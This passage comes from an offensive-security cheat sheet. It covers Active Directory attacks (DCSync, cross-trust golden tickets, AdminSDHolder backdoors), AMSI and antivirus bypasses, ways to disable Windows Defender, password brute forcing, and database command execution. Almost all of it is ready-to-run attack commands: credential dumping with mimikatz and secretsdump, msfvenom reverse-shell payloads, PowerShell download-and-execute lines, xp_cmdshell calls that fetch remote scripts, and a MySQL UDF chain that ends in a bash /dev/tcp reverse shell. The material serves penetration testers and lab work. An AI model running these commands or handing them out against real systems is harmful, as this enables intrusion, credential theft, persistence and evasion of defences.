PS > Invoke-DCSync -GetComputers -Domain megacorp.local -DomainController DC01.megacorp.local
```



### secretsdump.py

```
$ secretsdump.py MEGACORP/snovvcrash:'Passw0rd!'@DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\krbtgt'
$ secretsdump.py DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass
```


## Attack Trusts

* [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
* [http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/](http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/)
* [http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
* [https://habr.com/ru/company/jetinfosystems/blog/466445/](https://habr.com/ru/company/jetinfosystems/blog/466445/)

Enum foreign users and groups:

```
PowerView3 > Get-DomainTrust -Domain megacorp.com
PowerView3 > Get-DomainForeignGroupMember -Domain megacorp.com
PowerView3 > Get-DomainForeignUser -Domain megacorp.com
```



### sIDHistory/ExtraSids Hopping

* [http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)
* [http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/](http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)

Use PowerView to enumerate domain trusts:

```
PowerView2 > Get-NetForestDomain

Forest                  : megacorp.local
DomainControllers       : {DC03.megacorp.local, DC04.megacorp.local}
Children                : {child.megacorp.local}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  :
PdcRoleOwner            : DC03.megacorp.local
RidRoleOwner            : DC03.megacorp.local
InfrastructureRoleOwner : DC03.megacorp.local
Name                    : megacorp.local

Forest                  : megacorp.local
DomainControllers       : {DC01.child.megacorp.local, DC02.child.megacorp.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : megacorp.local
PdcRoleOwner            : DC01.child.megacorp.local
RidRoleOwner            : DC01.child.megacorp.local
InfrastructureRoleOwner : DC01.child.megacorp.local
Name                    : child.megacorp.local

PowerView2 > Invoke-MapDomainTrust

SourceDomain         TargetDomain         TrustType   TrustDirection
------------         ------------         ---------   --------------
child.megacorp.local megacorp.local       ParentChild Bidirectional
child.megacorp.local megacorp.com         External    Bidirectional
megacorp.com         child.megacorp.local External    Bidirectional
megacorp.local       child.megacorp.local ParentChild Bidirectional
```

Exploiting Bidirectional-ParentChild trust between child.megacorp.local <-> megacorp.local.

For creating a cross-trust golden ticket we'll need:

1. child domain FQDN (`child.megacorp.local`);
2. name of the child domain's DC machine account and its RID (`DC01$`, `31337`);
3. the SID of the child domain (`S-1-5-21-4266912945-3985045794-2943778634`);
4. the SID of the parent domain (`S-1-5-21-2284550090-1208917427-1204316795`);
5. compomised krbtgt hash from the child domain (`00ff00ff00ff00ff00ff00ff00ff00ff`);
6. ???
7. PROFIT.

```
1.
PS > $env:userdnsdomain
child.megacorp.local

2.
PowerView2 > Get-NetComputer -FullData DC01.child.megacorp.local | Select ObjectSID
S-1-5-21-4266912945-3985045794-2943778634-31337

3.
PowerView2 > Get-DomainSID
S-1-5-21-4266912945-3985045794-2943778634

4.
PS > (New-Object System.Security.Principal.NTAccount("megacorp.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
S-1-5-21-2284550090-1208917427-1204316795-502
```

Create cross-trust golden ticket:

```
mimikatz # kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:31337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt
Or
$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -user-id 31337 -groups 516 -domain child.megacorp.local -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -extra-sid S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 'DC01'
```

For DCSyncing we'll need only parent domain FQDN (`megacorp.local`):

```
PS > ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
megacorp.local
```

DCSync:

```
mimikatz # lsadump::dcsync /user:megacorp.local\krbtgt /domain:megacorp.local
```



### UnD + PrinterBug

* [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
* [https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
* [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)
* [https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe](https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe)



### Visualization (yEd)

* [http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
* [https://github.com/HarmJ0y/TrustVisualizer](https://github.com/HarmJ0y/TrustVisualizer)
* [https://www.yworks.com/products/yed](https://www.yworks.com/products/yed)

```
PowerView3 > Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv
$ git clone https://github.com/HarmJ0y/TrustVisualizer
$ python -m pip install networkx --proxy http://127.0.0.1:8090
$ ./TrustVisualizer.py trusts.csv
```




## Persistence



### Golden Ticket


#### impacket

```
$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain megacorp.local snovvcrash
$ export KRB5CCNAME=`pwd`/snovvcrash.ccache
$ psexec.py megacorp.local/snovvcrash@DC01.megacorp.local -k -no-pass
$ secretsdump.py megacorp.local/snovvcrash@DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass
```



### AdminSDHolder Modification

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
* [https://attack.stealthbits.com/adminsdholder-modification-ad-persistence](https://attack.stealthbits.com/adminsdholder-modification-ad-persistence)


#### Create a Backdoor

Add a new domain user or grant an existent user `GenericAll` permissions for the `AdminSDHolder` container:

```
PowerView3 > Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=megacorp,DC=local" -TargetDomain megacorp.local -PrincipalIdentity snovvcrash -PrincipalDomain megacorp.local -Rights All -Verbose
```

Check that granting `AdminSDHolder` permissions was successfull (may take 60+ minutes for the security ACLs to get updated for that user):

```
PowerView3 > Get-DomainUser snovvcrash | select objectsid
S-1-5-21-2284550090-1208917427-1204316795-9824

PowerView3 > Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=megacorp,DC=local" -Domain megacorp.local -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "S-1-5-21-2284550090-1208917427-1204316795-9824"}

AceType               : AccessAllowed
ObjectDN              : CN=AdminSDHolder,CN=System,DC=megacorp,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2284550090-1208917427-1204316795-9824
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

Now you can add yourself (the "snovvcrash" user) to the Domain Admins group any time and do stuff (actually adding the user to Domain Admins every time is not necessary, as the `AdminCount` attribute will stay `1` anyways after adding the backdoor user to a protected group for the first time):

```
PowerView3 > Add-DomainGroupMember -Identity "Domain Admins" -Members snovvcrash
PowerView3 > Get-DomainObjectAcl -Identity "Domain Admins" -Domain megacorp.local -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "S-1-5-21-2284550090-1208917427-1204316795-9824"}

AceType               : AccessAllowed
ObjectDN              : CN=Domain Admins,CN=Users,DC=megacorp,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2284550090-1208917427-1204316795-512
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2284550090-1208917427-1204316795-9824
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

PowerView3 > Remove-DomainGroupMember -Identity "Domain Admins" -Members snovvcrash
PowerView3 > Get-DomainUser snovvcrash | select admincount

admincount
----------
         1
```


#### Remove the Backdoor

* [https://www.reddefenseglobal.com/blog/microsoft-domain-attack-techniques/admincount/](https://www.reddefenseglobal.com/blog/microsoft-domain-attack-techniques/admincount/)
* [https://www.ucunleashed.com/1621](https://www.ucunleashed.com/1621)

Disable or remove the account (if a new user was created):

```
PS > net user snovvcrash /domain /active:no
PS > net user snovvcrash /domain /del
```

Remove user AdminSDHolder container via GUI (ADUC, dsa.msc).

Clear the `AdminCount` attribute (will be resetted if the user is still in the `AdminSDHolder` container):

```
PowerView3 > Set-DomainObject -Identity snovvcrash -Domain megacorp.local -Clear admincount -Verbose
Or
PS > Get-ADUser snovvcrash | Set-ADObject -Clear admincount
```

Fix the inheritance rules:

```
PS > [bool]$isProtected = $false
PS > [bool]$PreserveInheritance = $true
PS > [string]$dn = (Get-ADUser snovvcrash).DistinguishedName
PS > $user = [ADSI]"LDAP://$dn"
PS > $acl = $user.objectSecurity
PS > $acl.AreAccessRulesProtected
True  # procced if True
PS > $acl.SetAccessRuleProtection($isProtected, $PreserveInheritance)
PS > $inherited = $acl.AreAccessRulesProtected
PS > $user.commitchanges()
PS > $acl.AreAccessRulesProtected
False
```




## Misc

List all domain users:

```
PS > Get-ADUser -Filter * -SearchBase "DC=megacorp,DC=local" | select Name,SID
Or
PS > net user /domain
```

List all domain groups:

```
PS > Get-ADGroup -Filter * -SearchBase "DC=megacorp,DC=local" | select Name,SID
Or
PS > net group /domain
```

List all user's groups:

```
PS > Get-ADPrincipalGroupMembership snovvcrash | select Name
```

Create new domain user:

```
PS > net user snovvcrash Passw0rd! /add /domain
Or
PS > New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=megacorp,DC=local" -AccountPassword(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Enabled $true
```

Create new local user and add him to local admins:

```
PS > net user testuser Passw0rd! /add
PS > net localgroup administrators testuser /add
```

List deleted AD objects (AD recycle bin):

* [https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/](https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/)
* [https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)

```
PS > Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * | ft -autosize -wrap
```





# AMSI Bypass

* [AMSI.fail](https://amsi.fail/)
* [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
* [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
* [https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)




## Evil-WinRM + IEX

```
*Evil-WinRM* PS > menu
*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```




## Memory Patching

* [0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)

```
PS > IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/snovvcrash/5c9ee38bb9a8802a674ec3d3d33b4717/raw/5c77510505f505db8ac1453c60ee6fc34a8e6d59/Bypass-AMSI.ps1')
PS > Bypass-AMSI
```





# AV Evasion

* [https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
* [https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
* [https://github.com/phackt/stager.dll](https://github.com/phackt/stager.dll)
* [https://hausec.com/2019/02/09/suck-it-windows-defender/](https://hausec.com/2019/02/09/suck-it-windows-defender/)
* [https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
* [https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
* [https://xakep.ru/2020/12/23/shikata-ga-nai/](https://xakep.ru/2020/12/23/shikata-ga-nai/)
* [https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?gi=84db9a8c5c5f](https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?gi=84db9a8c5c5f)



## msfvenom

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f exe -o rev.exe
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e x86/shikata_ga_nai -i 9 -f raw | msfvenom --platform windows -a x86 -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 11 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -k -f exe -o met.exe
```




## Veil-Evasion

Hyperion + Pescramble

```
$ wine hyperion.exe input.exe output.exe
$ wine PEScrambler.exe -i input.exe -o output.exe
```




## Shelter

* [https://www.shellterproject.com/](https://www.shellterproject.com/)




## GreatSCT

Install and generate a payload:

```
$ git clone https://github.com/GreatSCT/GreatSCT ~/tools/GreatSCT
$ cd ~/tools/GreatSCT/setup
$ ./setup.sh
$ cd .. && ./GreatSCT.py
...generate a payload...
$ ls -la /usr/share/greatsct-output/handlers/payload.{rc,xml}

$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
```

Exec with `msbuild.exe` and get a shell:

```
PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
```

* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s)




## Invoke-Obfuscation

* [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
* [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)




## Out-EncryptedScript.ps1

* [https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
* [https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)

```
PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
PS > [string] $cmd = gc .\evil
PS > $dec = de "Passw0rd!" s4lt
PS > Invoke-Expression $dec
```




## Ebowla

```
$ git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
$ sudo apt install golang mingw-w64 wine python-dev -y
$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.13.37 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
$ vi genetic.config
...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
$ python ebowla.py rev.exe genetic.config && rm rev.exe
$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && rm output/go_symmetric_rev.exe.go
[+] output/ebowla-rev.exe
```




## Nim



### Install

Windows:

* [https://nim-lang.org/install_windows.html](https://nim-lang.org/install_windows.html)
* [https://git-scm.com/download/win](https://git-scm.com/download/win)

Linux:

```
$ sudo apt install mingw-w64 -y
$ curl https://nim-lang.org/choosenim/init.sh -sSf | sh
```



### Execute C# Assemblies

* [https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim)
* [https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/)
* [https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim)

Dependencies:

```
Nim > nimble install winim nimcrypto
```

Compile on Windows:

```
Cmd > nim c .\encrypt_assembly.nim
Cmd > nim c .\encrypted_assembly_loader.nim
```

Compile on Linux:

```
$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc encrypt_assembly.nim
$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc encrypted_assembly_loader.nim
```

Run:

```
Nim > .\encrypt_assembly.exe Passw0rd! SharpKatz.exe b64.txt
Nim > .\encrypted_assembly_loader.exe Passw0rd! b64.txt --Command logonpasswords
```




## Defender

* [https://github.com/swagkarna/Defeat-Defender/blob/main/Defeat-Defender.bat](https://github.com/swagkarna/Defeat-Defender/blob/main/Defeat-Defender.bat)

Disable real-time protection (proactive):

```
PS > Set-MpPreference -DisableRealTimeMonitoring $true
```

Disable scanning all downloaded files and attachments, disable AMSI (reactive):

```
PS > Set-MpPreference -DisableIOAVProtection $true
```

Remove signatures (if Internet connection is present, they will be downloaded again):

```
PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
Or
Cmd > "%PROGRAMFILES%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Add path to exclusions:

```
PS > $mimi = "C:\Users\snovvcrash\music\mimi\x64\mimikatz.exe"
PS > Add-MpPreference -ExclusionPath $mimi -AttackSurfaceReductionOnlyExclusions $mimi
```

Download stager without triggering Defender to scan it:

```
PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
```

Coerce the victim machine to reach the attacker (to steal Net-NTLM):

```
Cmd > C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
```




## Obfuscate Mimikatz

* [https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/](https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/)
* [https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)





# Application Whitelist Bypass

* [https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/](https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/)
* [https://vanmieghem.io/stealth-outlook-persistence/](https://vanmieghem.io/stealth-outlook-persistence/)





# AppLocker Bypass

* [https://github.com/api0cradle/UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [https://www.hackplayers.com/2018/12/english-cor-profilers-bypassing-windows.html](https://www.hackplayers.com/2018/12/english-cor-profilers-bypassing-windows.html)
* [https://0xdf.gitlab.io/2019/03/15/htb-ethereal-cor.html](https://0xdf.gitlab.io/2019/03/15/htb-ethereal-cor.html)





# Auth Brute Force




## Hydra

```
$ hydra -V -t 20 -f -I -L logins.lst -P /usr/share/john/password.lst 127.0.0.1 -s 8888 smtp
$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 8888 ftp
```




## Patator

```
$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
```





# Constrained Language Mode Bypass

In-place functions:

```
PS > whoami
The term 'whoami.exe' is not recognized as the name of cmdlet...
PS > &{ whoami }
megacorp\snovvcrash
```





# DBMS




## MySQL/MariaDB

Basic CLI syntax:

```
$ mysql -h 127.0.0.1 -P 3306 -u snovvcrash -p'Passw0rd!' -e 'show databases;'
```

Basic enumeration:

```
mysql> show GRANTS;
mysql> select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;
```



### UDF PrivEsc

* [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)
* [https://github.com/mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
* [https://gist.github.com/snovvcrash/efeb79d3e2648ec5009dd2ea7052f8b9](https://gist.github.com/snovvcrash/efeb79d3e2648ec5009dd2ea7052f8b9)

Install dependencies:

```
$ sudo apt install libmariadbclient-dev -y
$ git clone https://github.com/mysqludf/lib_mysqludf_sys && cd lib_mysqludf_sys
```

Compile `.so` library (x86 example):

```
$ sudo apt install libc6-dev-i386 -y
$ gcc lib_mysqludf_sys.c -o lib_mysqludf_sys_x86.so -m32 -Wl,--hash-style=both -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
```

Compile `.so` library (x64 example):

```
$ gcc lib_mysqludf_sys.c -o lib_mysqludf_sys_x64.so -m64 -Wl,--hash-style=both -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/server/private -I. -shared -L/usr/lib/x86_64-linux-gnu/libstdc++.so.6
```

Convert library to hex:

```
$ xxd -p lib_mysqludf_sys.so | tr -d '\n'
```

Load library and call user-defined `sys_exec` function with a rev-shell.

MySQL (x86 example):

```
mysql> use mysql;
mysql> create table pwn(line blob);
mysql> insert into pwn values(load_file('/tmp/lib_mysqludf_sys_x86.so'));
mysql> select * from pwn into dumpfile '/usr/lib/lib_mysqludf_sys_x86.so';

Or load it from hex:
mysql> set @pwn = '7F..00';
mysql> select unhex(@pwn) into dumpfile '/usr/lib/lib_mysqludf_sys_x86.so';

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_x86.so';
mysql> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");
```

MariaDB (x64 example):

```
MariaDB> show variables like '%plugin%';  # get lib path
MariaDB> use mysql;
MariaDB> create table pwn(line blob);
MariaDB> insert into pwn values(load_file('/tmp/lib_mysqludf_sys_x64.so'));
MariaDB> select * from pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_x64.so';

Or load it from hex:
MariaDB> set @pwn = 0x7F..00;
MariaDB> select binary @pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_x64.so';

MariaDB> create function sys_exec returns integer soname 'lib_mysqludf_sys_x64.so';
MariaDB> select sys_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");
```




## Oracle

* [https://xakep.ru/2015/04/07/195-oracle-db/](https://xakep.ru/2015/04/07/195-oracle-db/)
* [https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)
* [https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener)
* [http://www.red-database-security.com/wp/oracle_cheat.pdf](http://www.red-database-security.com/wp/oracle_cheat.pdf)



### odat

* [https://github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)

Install manually (depreciated):

* [https://github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)

```
$ git clone https://github.com/quentinhardy/odat ~/tools/odat && cd ~/tools/odat
$ git submodule init && git submodule update
$ sudo apt install libaio1 python3-dev alien python3-pip
$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-basic-19.6.0.0.0-1.x86_64.rpm
$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-devel-19.6.0.0.0-1.x86_64.rpm
$ sudo alien --to-deb *.rpm
$ sudo dpkg -i *.deb
$ vi /etc/profile
...
export ORACLE_HOME=/usr/lib/oracle/19.6/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
...
$ pip3 install cx_Oracle
$ python3 odat.py -h
```



### TNS Poison

* [http://www.joxeankoret.com/download/tnspoison.pdf](http://www.joxeankoret.com/download/tnspoison.pdf)
* [https://www.youtube.com/watch?v=0IKltOBXiII](https://www.youtube.com/watch?v=0IKltOBXiII)

Check with Nmap:

```
$ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
$ sudo nmap -v -n -Pn -sV --script oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 10.10.13.37
```

Brute SID with MSF:

```
msf > use use auxiliary/scanner/oracle/sid_brute
```

Brute SID with odat:

```
$ odat sidguesser -s 10.10.13.37 -p 1521
```

Exploit with odat:

* [https://github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)

```
$ odat tnspoison -s 10.10.13.37 -d <SID> --test-module
$ odat tnspoison -s 10.10.13.37 -d <SID> --poison
```




## MS SQL



### Enable xp_cmdshell

```
1> EXEC sp_configure 'show advanced options', 1
2> GO
1> RECONFIGURE
2> GO
1> EXEC sp_configure 'xp_cmdshell', 1
2> GO
1> RECONFIGURE
2> GO
1> xp_cmdshell whoami
2> GO
```



### sqsh

```
$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
2> GO
```



### mssqlclient.py

```
$ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.13.37/rev.ps1\")"
```



### mssql-cli

* [https://github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)

```
$ python -m pip install mssql-cli
$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
```



### DBeaver

* [DBeaver Community](https://dbeaver.io/)



### DbVisualizer

* [DbVisualizer](https://www.dbvis.com/)




## SQLite

```
SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='secret_database';
SELECT username,password FROM secret_database;
```




## Redis

* [https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
* [2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
* [https://github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
* [https://github.com/antirez/redis](https://github.com/antirez/redis)

Check for anonymous login:

```
$ nc 127.0.0.1 6379
Escape character is '^]'.
echo "Hey, no AUTH required!"
$21
